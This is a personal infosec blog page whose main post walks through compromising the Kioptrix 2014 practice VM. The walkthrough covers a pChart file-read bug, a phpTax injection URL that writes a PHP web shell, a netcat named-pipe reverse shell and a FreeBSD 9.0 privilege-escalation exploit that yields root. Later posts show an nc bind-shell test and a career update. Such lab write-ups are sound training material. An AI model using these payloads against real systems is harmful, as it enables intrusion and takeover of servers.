+<p>After starting the VM, I had to find the system&#8217;s IP address, so I ran netdiscover and it was quickly found. To find the open ports and identify the services, I ran nmap:</p>
+<pre>root@kali:~# nmap [IP-REDACTED] -sV
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-10-11 15:59 EDT
+Nmap scan report for kioptrix2014.lan ([IP-REDACTED])
+Host is up (0.00044s latency).
+Not shown: 997 filtered ports
+PORT STATE SERVICE VERSION
+22/tcp closed ssh
+<strong>80/tcp open http Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</strong>
+<strong>8080/tcp open http Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</strong>
+MAC Address: 08:00:27:DC:55:1C (Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.66 seconds</pre>
+<p>Opening a web browser on port 8080 shows a 403 forbidden error message. Nothing too interesting in the response. The page returned on port 80 is more interesting though&#8230; When rendered, it&#8217;s just a heading that says &#8220;It works!&#8221;, but the source includes a commented out &lt;meta refresh&gt; that would redirect the browser to http://[IP-REDACTED]/pChart2.1.3/examples/index.php.</p>
+<p>Initially, I thought I could inject some PHP in here. For example if I went to the sandbox and  changed my chart title to <strong>-&#8220;.shell_exec(&#8220;whoami&#8221;).&#8221;-</strong> then clicked the &#8220;Show code&#8221; button, it showed me that one line of code that would run would be</p>
+<pre>$myPicture-&gt;drawText(350,25,"-".shell_exec("whoami")."-",$TextSettings);</pre>
+<p>but when I clicked &#8220;Render picture&#8221;, the title was<strong>-&#8220;.shell_exec(&#8220;whoami&#8221;).&#8221;-</strong>, so it must have escaped it somehow when it really made the picture. Damn.</p>
+<p>Next thing to try is looking for a known exploit for pChart:</p>
+<pre>root@kali:~# searchsploit pchart
+--------------------------------------------- ----------------------------------
+ Exploit Title | Path
+ | (/usr/share/exploitdb/platforms/)
+--------------------------------------------- ----------------------------------
+pChart 2.1.3 - Multiple Vulnerabilities | php/webapps/31173.txt
+--------------------------------------------- ----------------------------------</pre>
+<p>That txt file suggests that I can read any file on the system that the account running apache can read using a maliciously crafted url, for example http://[IP-REDACTED]/examples/index.php?Action=View&amp;Script=/etc/passwd</p>
+<p>Interestingly, we can see how this exploit works by examining the first line of index.php, which can be seen by visiting http://[IP-REDACTED]/pChart2.1.3/examples/index.php?Action=View&amp;Script=index.php , which is:</p>
+<pre>&lt;?php if ( isset($_GET["Action"])) { $Script = $_GET["Script"]; highlight_file($Script); exit(); } ?&gt;</pre>
+<p>. We don&#8217;t even really need a value set for &#8220;Action&#8221;; http://[IP-REDACTED]/pChart2.1.3/examples/index.php?<strong>Action</strong>&amp;Script=index.php works just as well.</p>
+<p>Anyway, there&#8217;s not much of great interest that this account can access, but perhaps we can find out why we are seeing a 403 forbidden response when we connect to port 8080&#8230;</p>
+<p><a href="https://www.freebsd.org/doc/handbook/network-apache.html">The apache config file on FreeBSD is located in /usr/local/etc/apache2x/httpd.conf</a>, (on this system, since it&#8217;s apache 2.2, we should replace the &#8220;x&#8221; with a &#8220;2&#8221;) so we&#8217;ll look at that with http://[IP-REDACTED]/pChart2.1.3/examples/index.php?Action&amp;Script=/usr/local/etc/apache22/httpd.conf and at the bottom of the file is:</p>
+<pre>SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser
+
+&lt;VirtualHost *:8080&gt;
+    DocumentRoot /usr/local/www/apache22/data2
+
+&lt;Directory "/usr/local/www/apache22/data2"&gt;
+    Options Indexes FollowSymLinks
+    AllowOverride All
+    Order allow,deny
+    Allow from env=Mozilla4_browser
+&lt;/Directory&gt;</pre>
+<p>This tells us that port 8080 is serving files from /usr/local/www/apache22/data2, and that requests will only be allowed if the user agent starts with &#8220;Mozilla/4.0 Mozilla4_browser&#8221; . See https://httpd.apache.org/docs/2.4/mod/mod_setenvif.html and http://httpd.apache.org/docs/current/mod/mod_access_compat.html#allow for more details of how that works.</p>
+<p>Changing our user agent to &#8220;Mozilla/4.0 Mozilla4_browser_NOT REALLY!&#8221; makes apache respond to our requests to port 80, and the response says that there is a directory called phptax. This shows us a very ugly and dated web application that I clicked around, but couldn&#8217;t find anything interesting, so I used searchsploit again:</p>
+<pre>root@kali:~# searchsploit phptax
+------------------------------------------------------------------ ----------------------------------
+ Exploit Title | Path
+ | (/usr/share/exploitdb/platforms/)
+------------------------------------------------------------------ ----------------------------------
+PhpTax - pfilez Parameter Exec Remote Code Injection (Metasploit) | php/webapps/21833.rb
+phptax 0.8 - Remote Code Execution | php/webapps/21665.txt
+PhpTax 0.8 - File Manipulation (newvalue) / Remote Code Execution | php/webapps/25849.txt
+------------------------------------------------------------------ ----------------------------------</pre>
+<p>The second one looks interesting, it basically says that we can get remote code execution because user input is not sanitised before being used in php&#8217;s exec() function. I&#8217;ll confirm this works by writing a <a href="/single-line-php-script-to-gain-shell/">single line php backdoor file</a> by visiting http://[IP-REDACTED]:8080/phptax/drawimage.php?pfilez=xxx;echo &#8220;&lt;?php echo shell_exec(\$_GET[&#8216;e&#8217;].&#8217; 2&gt;%261&#8242;);?&gt;&#8221;&gt;backdoor.php;&amp;pdf=make in my browser, then http://[IP-REDACTED]:8080/backdoor.php?e=whoami to make sure it worked. It did, and now I can execute shell commands <strong>and see the output</strong></p>
+<p>It would be really nice to have a remote shell. I tried using &#8220;nc &lt;IP&gt; &lt;PORT&gt; -e /bin/sh&#8221;, but that didn&#8217;t work and &#8220;nc -h&#8221; showed why; -e is for specifying an IPsec policy (whatever that means) on this version of nc. We&#8217;ll have to try something else; I remember some time ago that I was able to use a named fifo pipe in order to get a shell with nc. This command worked for me to connect to a netcat listener:</p>
+<pre>mkfifo pipe;nc [IP ADDR] [PORT]&lt;pipe|/bin/sh&gt;pipe 2&gt;pipe;rm pipe</pre>
+<p>Running &#8220;uname -r&#8221; tells us that we&#8217;re on a FreeBSD 9.0 system. Let&#8217;s try to get root. Back to searchsploit:</p>
+<pre>root@kali:~# searchsploit -t FreeBSD 9
+------------------------------------------------------------------------- ----------------------------------
+ Exploit Title | Path
+ | (/usr/share/exploitdb/platforms/)
+------------------------------------------------------------------------- ----------------------------------
+FreeBSD 2.x / HP-UX 9/10/11 / Kernel 2.0.3 / Windows NT 4.0/Server 2003 | multiple/dos/20810.c
+FreeBSD 2.x / HP-UX 9/10/11 / Kernel 2.0.3 / Windows NT 4.0/Server 2003 | multiple/dos/20811.cpp
+FreeBSD 2.x / HP-UX 9/10/11 / Kernel 2.0.3 / Windows NT 4.0/Server 2003 | windows/dos/20812.c
+FreeBSD 2.x / HP-UX 9/10/11 / Kernel 2.0.3 / Windows NT 4.0/Server 2003 | multiple/dos/20813.c
+FreeBSD 2.x / HP-UX 9/10/11 / Kernel 2.0.3 / Windows NT 4.0/Server 2003 | windows/dos/20814.c
+FreeBSD 9.1 ftpd - Remote Denial of Service | freebsd/dos/24450.txt
+FreeBSD mcweject 0.9 (eject) - Buffer Overflow Privilege Escalation | bsd/local/3578.c
+BSD/OS 2.1 / DG/UX 4.0 / Debian 0.93 / Digital UNIX 4.0 B / FreeBSD 2.1. | unix/local/19203.c
+FreeBSD 9.0 &lt; 9.1 mmap/ptrace - Privilege Escalation | freebsd/local/26368.c
+FreeBSD 9 - Address Space Manipulation Privilege Escalation (Metasploit) | freebsd/local/26454.rb
+FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation | freebsd/local/28718.c
+FreeBSD/x86 - rev connect_ recv_ jmp_ return results Shellcode (90 bytes | freebsd_x86/shellcode/13265.c
+FreeBSD/x86 - Rortbind Reverse 127.0.0.1:8000 /bin/sh Shellcode (89 byte | freebsd_x86/shellcode/13267.asm
+------------------------------------------------------------------------- ----------------------------------</pre>
+<p>26368 looks promising, let&#8217;s send it to the remote machine. I ran this on my attacking machine:</p>
+<pre>searchsploit -m 26368;nc -vnlp 6666 &lt;26368.c</pre>
+<p>then ran this on the remote system:</p>
+<pre>nc 192.168.23.120 6666 &gt;26368.c</pre>
+<p>and after a few seconds, I hit CTRL+C to close the nc session. Not I have the exploit on the FreeBSD system, so I can compile it and run it:</p>
+<pre>gcc 26368.c -o 26368
+./26368
+whoami
+root</pre>
+<p>We&#8217;ve got root! Inside root&#8217;s home directory is a nice txt file with some interesting information that we can read using cat</p>
+<p>I recently learned that <a href="http://www.kioptrix.com/blog/farewell-loneferret/">the guy that made this VM (Steven “loneferret” McElrea) passed away a couple of months ago</a>. I&#8217;m grateful for the time he put into making this VM and my thoughts go out to his family.</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/exploit/" rel="category tag">Exploit</a>, <a href="/category/infosec/" rel="category tag">Information Security</a>, <a href="/category/infosec/pentest/" rel="category tag">Penetration Test</a>, <a href="/category/php/" rel="category tag">PHP</a>, <a href="/category/shell/" rel="category tag">Shell</a>, <a href="/category/uncategorized/" rel="category tag">Uncategorized</a>, <a href="/category/unix/" rel="category tag">Unix</a>, <a href="/category/web-server/" rel="category tag">Web Server</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/kioptrix-2014/#comments"><b>1</b> Reply</a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-312 -->
+
+				
+					
+	<article id="post-310" class="post-310 post type-post status-publish format-standard hentry category-career category-conference category-infosec">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/i-got-a-job-at-an-information-security-company/" rel="bookmark">I got a job at an information security company!</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/i-got-a-job-at-an-information-security-company/" title="7:46 PM" rel="bookmark"><time class="entry-date" datetime="2017-10-11T19:46:34+00:00">2017-10-11</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/i-got-a-job-at-an-information-security-company/#respond"><span class="leave-reply">Reply</span></a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>In a previous blog post, I said that I attended B-Sides London earlier this year. It turns out that was probably one of the best things I&#8217;ve done this year because, not only was it very enjoyable, but I ended up speaking to a quite a lot of people while I was there, including some people that worked at security companies that were recruiting and I ended up getting a job at a company that is well known in the infosec world.</p>
+<p>It was about time I moved on from my previous position, and this is a real step up for me. I&#8217;ve been working there for a few weeks now and I&#8217;m really enjoying it, the work is fun and interesting, the working environment is brilliant. It&#8217;s just great to be working in a field that I&#8217;m interested in and be somewhere that cares about career progression.</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/career/" rel="category tag">Career</a>, <a href="/category/infosec/conference/" rel="category tag">Conference</a>, <a href="/category/infosec/" rel="category tag">Information Security</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/i-got-a-job-at-an-information-security-company/#respond"><span class="leave-reply">Leave a reply</span></a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-310 -->
+
+				
+					
+	<article id="post-307" class="post-307 post type-post status-publish format-standard hentry category-uncategorized">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/new-alternate-emoji-domain/" rel="bookmark">New alternate emoji domain</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/new-alternate-emoji-domain/" title="2:27 PM" rel="bookmark"><time class="entry-date" datetime="2017-08-16T14:27:14+00:00">2017-08-16</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/new-alternate-emoji-domain/#respond"><span class="leave-reply">Reply</span></a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>This is not really security related, but it&#8217;s a bit of fun so I wrote a quick post.</p>
+<p>I had heard that emoji domains are available from select TLDs, so I decided to buy one! I am now the proud owner of &#x1f4bb;☠.ws, which mirrors this site.</p>
+<p>Now, if you go to grobinson.me and your browser supports emoji domains without displaying the punycode translation (xn--h4h3030o.ws) in the address bar, you will be redirected to the same page on &#x1f4bb;☠.ws thanks to <a href="https://github.com/jonroig/emojiurlifier">this little piece of javascript</a>.</p>
+<p>Check your address bar now. You may already using the emoji domain without even knowing.</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/uncategorized/" rel="category tag">Uncategorized</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/new-alternate-emoji-domain/#respond"><span class="leave-reply">Leave a reply</span></a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-307 -->
+
+				
+					
+	<article id="post-295" class="post-295 post type-post status-publish format-standard hentry category-development category-infosec category-lesson-learned category-online-course category-oscp category-pentest category-python">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/nc-exe-v1-10-nt-crashes-when-e-used-and/" rel="bookmark">nc.exe v1.10 NT crashes when -e used and <323 bytes sent in a line</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/nc-exe-v1-10-nt-crashes-when-e-used-and/" title="1:02 PM" rel="bookmark"><time class="entry-date" datetime="2017-08-07T13:02:27+00:00">2017-08-07</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/nc-exe-v1-10-nt-crashes-when-e-used-and/#respond"><span class="leave-reply">Reply</span></a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>I&#8217;m currently working through the PWK course from offensive-security, hoping to get my OSCP certification. While following the course materials, I&#8217;ve got to a section that talks about methods of transferring binary files after you have a shell on a remote system.</p>
+<p>One of the methods suggested is converting the file to text using exe2bat.exe to convert the file into a series of echo commands with redirection to a file that can be copy/pasted into the shell and finally running debug.exe to convert the file back into an exe. It&#8217;s a pretty well known method, detailed instructions can be found easily with google.</p>
+<p>I hit a problem when working through this though&#8230; I created a bind shell using nc.exe (v1.10 NT) and when i connected to this and pasted in the lines from the bat file created by exe2bat.exe, the nc.exe process would crash. It turned out to be crashing when it got the 3rd line from the bat file. I thought this was strange, so I contacted offensive-security support and they confirmed my findings, but weren&#8217;t sure why and suggested I used a different method to get a remote shell, e.g. using msfvenom.</p>
+<p>I have done some testing myself, and wrote a python script that tells me what it received and how long it was so that I could see in more detail what was going on. The script is:</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr>
+<td class="line_numbers"><pre>1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td>
+<td class="code"><pre class="python" style="font-family:monospace;"><span style="color: #808080; font-style: italic;">#!/usr/bin/env python3</span>
+&nbsp;
+<span style="color: #ff7700;font-weight:bold;">import</span> <span style="color: #dc143c;">sys</span>
+&nbsp;
+<span style="color: #ff7700;font-weight:bold;">print</span><span style="color: black;">&#40;</span><span style="color: #483d8b;">'pypipe.py v0.1'</span><span style="color: black;">&#41;</span>
+<span style="color: #ff7700;font-weight:bold;">print</span><span style="color: black;">&#40;</span><span style="color: #483d8b;">'--------------'</span><span style="color: #66cc66;">,</span> flush<span style="color: #66cc66;">=</span><span style="color: #008000;">True</span><span style="color: black;">&#41;</span>
+&nbsp;
+<span style="color: #ff7700;font-weight:bold;">for</span> idx<span style="color: #66cc66;">,</span> line <span style="color: #ff7700;font-weight:bold;">in</span> <span style="color: #008000;">enumerate</span><span style="color: black;">&#40;</span><span style="color: #dc143c;">sys</span>.<span style="color: black;">stdin</span><span style="color: black;">&#41;</span>:
+    line <span style="color: #66cc66;">=</span> line.<span style="color: black;">strip</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span>
+    <span style="color: #ff7700;font-weight:bold;">print</span><span style="color: black;">&#40;</span><span style="color: #483d8b;">'# Received line {}. Length (bytes):{}'</span>.<span style="color: black;">format</span><span style="color: black;">&#40;</span>
+            <span style="color: #008000;">str</span><span style="color: black;">&#40;</span>idx<span style="color: black;">&#41;</span>.<span style="color: black;">zfill</span><span style="color: black;">&#40;</span><span style="color: #ff4500;">3</span><span style="color: black;">&#41;</span><span style="color: #66cc66;">,</span>
+            <span style="color: #008000;">str</span><span style="color: black;">&#40;</span><span style="color: #008000;">len</span><span style="color: black;">&#40;</span>line<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span>.<span style="color: black;">zfill</span><span style="color: black;">&#40;</span><span style="color: #ff4500;">3</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #66cc66;">,</span>
+        flush<span style="color: #66cc66;">=</span><span style="color: #008000;">True</span><span style="color: black;">&#41;</span></pre></td>
+</tr></table>
+<p class="theCode" style="display:none;">#!/usr/bin/env python3
+
+import sys
+
+print('pypipe.py v0.1')
+print('--------------', flush=True)
+
+for idx, line in enumerate(sys.stdin):
+    line = line.strip()
+    print('# Received line {}. Length (bytes):{}'.format(
+            str(idx).zfill(3),
+            str(len(line)).zfill(3)),
+        flush=True)</p>
+</div>
+
+<p>Binding this to port 80 on windows with</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr><td class="code"><pre class="bash" style="font-family:monospace;">nc <span style="color: #660033;">-nvlp</span> <span style="color: #000000;">80</span> <span style="color: #660033;">-e</span> <span style="color: #ff0000;">&quot;py pypipe.py&quot;</span></pre></td></tr></table>
+<p class="theCode" style="display:none;">nc -nvlp 80 -e &quot;py pypipe.py&quot;</p>
+</div>
+
+<p>and then connecting with netcat on my other system makes any input get reported back to the remote system line by line, and i can see that the problem happens when a long line is sent. I could also tell that it accepted a line with 323 characters, but when i sent 324, it crashed.</p>
+<p>I suspect I&#8217;m seeing the bug mentioned <a href="https://www.exploit-db.com/exploits/726/">here</a> and <a href="https://www.exploit-db.com/exploits/16436/">here</a>.</p>
+<p>So I&#8217;ve learned that I can&#8217;t use that version of nc.exe to send binary files that have been converted into long text strings. Different versions of nc probably don&#8217;t have this issue.</p>
+<p>While this is a problem because it&#8217;s an exploitable bug, this is not much of a problem for transferring binary files because in real world secenarios because there won&#8217;t be nc.exe on the system unless I&#8217;ve already found a way of getting a binary file onto the system, but it&#8217;s something that did trip me up for a few hours while doing the PWK course.</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/development/" rel="category tag">Development</a>, <a href="/category/infosec/" rel="category tag">Information Security</a>, <a href="/category/lesson-learned/" rel="category tag">Lesson Learned</a>, <a href="/category/education/online-course/" rel="category tag">Online Course</a>, <a href="/category/education/online-course/oscp/" rel="category tag">OSCP</a>, <a href="/category/infosec/pentest/" rel="category tag">Penetration Test</a>, <a href="/category/development/python/" rel="category tag">Python</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/nc-exe-v1-10-nt-crashes-when-e-used-and/#respond"><span class="leave-reply">Leave a reply</span></a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-295 -->
+
+				
+					
+	<article id="post-290" class="post-290 post type-post status-publish format-standard hentry category-uncategorized">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/hack-the-box/" rel="bookmark">Hack the Box</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/hack-the-box/" title="4:33 PM" rel="bookmark"><time class="entry-date" datetime="2017-06-26T16:33:20+00:00">2017-06-26</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/hack-the-box/#comments">1</a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>I recently came across <a href="https://www.hackthebox.eu/">Hack The Box</a> and have been having fun pwning some of those machines using the techniques that I have learned in the free <a href="https://www.offensive-security.com/metasploit-unleashed/">Metasploit Unleashed</a> course. Metasploit really is a great tool, and even though I could have got some &#8220;user owns&#8221; without it, I found that once I had learned how to use things like msfvenom, it saved me having to write some of my own trivial scripts, which saved me time.</p>
+<p>I&#8217;ve currently got 3 &#8220;System Owns&#8221; and 4 &#8220;User Owns&#8221;, which puts me on &#8220;Script Kiddie&#8221; status. I&#8217;m hoping to get a few more and move to a better status fairly quickly, if I can find the time to play around some more.</p>
+<p>I especially like the way you have to <a href="https://www.hackthebox.eu/en/invite">hack the invite</a> before you can gain access to any machines. It was probably the easiest part of any of the challenges I have attempted, but that might be because I&#8217;m pretty familiar with web technologies.</p>
+<p>If you haven&#8217;t tried it out, I would encourage you to do so. The website is <strong>very</strong> polished, and there are quite a lot of machines to attack 🙂</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/uncategorized/" rel="category tag">Uncategorized</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/hack-the-box/#comments"><b>1</b> Reply</a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-290 -->
+
+				
+							<nav id="nav-below">
+				<h3 class="assistive-text">Post navigation</h3>
+				<div class="nav-previous"><a href="/page/2/"><span class="meta-nav">&larr;</span> Older posts</a></div>
+				<div class="nav-next"></div>
+			</nav><!-- #nav-above -->
+			
+			
+			</div>
+<!-- #content -->
+		</div>
+<!-- #primary -->
+
+		<div id="secondary" class="widget-area" role="complementary">
+			<aside id="rss-2" class="widget widget_rss"><h3 class="widget-title">
+<a class="rsswidget rss-widget-feed" href="/?feed=rss"><img class="rss-widget-icon" style="border:0" width="14" height="14" src="/wp-includes/images/rss.png" alt="RSS" loading="lazy"></a> <a class="rsswidget rss-widget-title" href="/">grobinson.me RSS feed</a>
+</h3>
+<ul><li><a class="rsswidget" href="/learning-more-about-buffer-overflow-exploits/">Learning more about buffer overflow exploits</a></li></ul></aside><aside id="search-2" class="widget widget_search">	<form method="get" id="searchform" action="/">
+		<label for="s" class="assistive-text">Search</label>
+		<input type="text" class="field" name="s" id="s" placeholder="Search">
+		<input type="submit" class="submit" name="submit" id="searchsubmit" value="Search">
+	</form>
+</aside>
+		<aside id="recent-posts-2" class="widget widget_recent_entries">
+		<h3 class="widget-title">Recent Posts</h3>
+		<ul>
+											<li>
+					<a href="/learning-more-about-buffer-overflow-exploits/">Learning more about buffer overflow exploits</a>
+									</li>
+											<li>
+					<a href="/reverse-shells-even-without-nc-on-linux/">Reverse shells even without nc on Linux</a>
+									</li>
+											<li>
+					<a href="/i-discovered-a-vulnerability-in-a-wordpress-plugin/">I discovered a vulnerability in a wordpress plugin</a>
+									</li>
+											<li>
+					<a href="/i-passed-oscp/">I passed OSCP!</a>
+									</li>
+											<li>
+					<a href="/fristileaks-1-3/">FristiLeaks 1.3</a>
+									</li>
+					</ul>
+
+		</aside><aside id="recent-comments-2" class="widget widget_recent_comments"><h3 class="widget-title">Recent Comments</h3>
+<ul id="recentcomments">
+<li class="recentcomments">
+<span class="comment-author-link"><a href="/" class="url" rel="ugc">Graeme Robinson</a></span> on <a href="/single-line-php-script-to-gain-shell/#comment-5077679">Single Line PHP Script to Gain Shell</a>
+</li>
+<li class="recentcomments">
+<span class="comment-author-link">Daniel</span> on <a href="/single-line-php-script-to-gain-shell/#comment-5061347">Single Line PHP Script to Gain Shell</a>
+</li>
+<li class="recentcomments">
+<span class="comment-author-link"><a href="https://www.instagram.com/endego.dj/" class="url" rel="ugc external nofollow">Errorgedill</a></span> on <a href="/learning-more-about-buffer-overflow-exploits/#comment-5021162">Learning more about buffer overflow exploits</a>
+</li>
+<li class="recentcomments">
+<span class="comment-author-link"><a href="/reverse-shells-even-without-nc-on-linux/" class="url" rel="ugc">Reverse shells even without nc on Linux | Graeme Robinson&#039;s blog</a></span> on <a href="/single-line-php-script-to-gain-shell/#comment-4568725">Single Line PHP Script to Gain Shell</a>
+</li>
+<li class="recentcomments">
+<span class="comment-author-link"><a href="/i-passed-oscp/" class="url" rel="ugc">I passed OSCP! | Graeme Robinson&#039;s blog</a></span> on <a href="/ive-signed-up-to-the-penetration-testing-with-kali-linux-course-oscp/#comment-4568721">I&#8217;ve signed up to the Penetration testing with Kali Linux Course (OSCP)</a>
+</li>
+</ul></aside><aside id="archives-2" class="widget widget_archive"><h3 class="widget-title">Archives</h3>
+			<ul>
+					<li><a href="/2018/07/">July 2018</a></li>
+	<li><a href="/2018/04/">April 2018</a></li>
+	<li><a href="/2017/10/">October 2017</a></li>
+	<li><a href="/2017/08/">August 2017</a></li>
+	<li><a href="/2017/06/">June 2017</a></li>
+	<li><a href="/2016/08/">August 2016</a></li>
+	<li><a href="/2014/11/">November 2014</a></li>
+	<li><a href="/2013/01/">January 2013</a></li>
+	<li><a href="/2012/12/">December 2012</a></li>
+	<li><a href="/2012/11/">November 2012</a></li>
+	<li><a href="/2012/10/">October 2012</a></li>
+	<li><a href="/2012/09/">September 2012</a></li>
+	<li><a href="/2012/08/">August 2012</a></li>
+			</ul>
+
+			</aside><aside id="categories-2" class="widget widget_categories"><h3 class="widget-title">Categories</h3>
+			<ul>
+					<li class="cat-item cat-item-47">
+<a href="/category/ios/jailbreak/appsync/">AppSync</a>
+</li>
+	<li class="cat-item cat-item-16">
+<a href="/category/infosec/hash/crack/brute-force/">Brute Force</a>
+</li>
+	<li class="cat-item cat-item-62">
+<a href="/category/exploit/exploit-development/buffer-overflow/">Buffer Overflow</a>
+</li>
+	<li class="cat-item cat-item-55">
+<a href="/category/career/">Career</a>
+</li>
+	<li class="cat-item cat-item-20">
+<a href="/category/comic/">Comic</a>
+</li>
+	<li class="cat-item cat-item-35">
+<a href="/category/infosec/compromise/">Compromise</a>
+</li>
+	<li class="cat-item cat-item-52">
+<a href="/category/infosec/conference/">Conference</a>
+</li>
+	<li class="cat-item cat-item-13">
+<a href="/category/infosec/hash/crack/">Crack</a>
+</li>
+	<li class="cat-item cat-item-48">
+<a href="/category/development/">Development</a>
+</li>
+	<li class="cat-item cat-item-41">
+<a href="/category/education/">Education</a>
+</li>
+	<li class="cat-item cat-item-27">
+<a href="/category/email/">Email</a>
+</li>
+	<li class="cat-item cat-item-5">
+<a href="/category/infosec/encryption/">Encryption</a>
+</li>
+	<li class="cat-item cat-item-30">
+<a href="/category/exploit/">Exploit</a>
+</li>
+	<li class="cat-item cat-item-40">
+<a href="/category/exploit-excercises/">Exploit Excercises</a>
+</li>
+	<li class="cat-item cat-item-58">
+<a href="/category/exploit/exploit-db/">exploit-db</a>
+</li>
+	<li class="cat-item cat-item-21">
+<a href="/category/os-x/filevault/">FileVault</a>
+</li>
+	<li class="cat-item cat-item-24">
+<a href="/category/infosec/encryption/full-disk-encryption/">Full Disk Encryption</a>
+</li>
+	<li class="cat-item cat-item-36">
+<a href="/category/passwords/google-authenticator/">Google Authenticator</a>
+</li>
+	<li class="cat-item cat-item-9">
+<a href="/category/infosec/hash/">Hash</a>
+</li>
+	<li class="cat-item cat-item-14">
+<a href="/category/infosec/hash/crack/hashcat/">HashCat</a>
+</li>
+	<li class="cat-item cat-item-25">
+<a href="/category/email/hotmail/">Hotmail</a>
+</li>
+	<li class="cat-item cat-item-61">
+<a href="/category/exploit/exploit-development/immunity/">Immunity</a>
+</li>
+	<li class="cat-item cat-item-4">
+<a href="/category/infosec/">Information Security</a>
+</li>
+	<li class="cat-item cat-item-45">
+<a href="/category/ios/">iOS</a>
+</li>
+	<li class="cat-item cat-item-46">
+<a href="/category/ios/jailbreak/">JailBreak</a>
+</li>
+	<li class="cat-item cat-item-8">
+<a href="/category/infosec/hash/crack/john-the-ripper/">John The Ripper</a>
+</li>
+	<li class="cat-item cat-item-57">
+<a href="/category/kali/">Kali</a>
+</li>
+	<li class="cat-item cat-item-33">
+<a href="/category/passwords/lastpass/">LastPass</a>
+</li>
+	<li class="cat-item cat-item-37">
+<a href="/category/lesson-learned/">Lesson Learned</a>
+</li>
+	<li class="cat-item cat-item-39">
+<a href="/category/unix/linux/">Linux</a>
+</li>
+	<li class="cat-item cat-item-60">
+<a href="/category/exploit/exploit-development/mona-py/">mona.py</a>
+</li>
+	<li class="cat-item cat-item-42">
+<a href="/category/education/online-course/">Online Course</a>
+</li>
+	<li class="cat-item cat-item-23">
+<a href="/category/os-x/">OS X</a>
+</li>
+	<li class="cat-item cat-item-53">
+<a href="/category/education/online-course/oscp/">OSCP</a>
+</li>
+	<li class="cat-item cat-item-19">
+<a href="/category/passwords/password-complexity/">Password Complexity</a>
+</li>
+	<li class="cat-item cat-item-32">
+<a href="/category/passwords/password-reuse/">Password Reuse</a>
+</li>
+	<li class="cat-item cat-item-18">
+<a href="/category/passwords/">Passwords</a>
+</li>
+	<li class="cat-item cat-item-7">
+<a href="/category/infosec/pentest/">Penetration Test</a>
+</li>
+	<li class="cat-item cat-item-29">
+<a href="/category/php/">PHP</a>
+</li>
+	<li class="cat-item cat-item-44">
+<a href="/category/passwords/plaintext/">Plaintext</a>
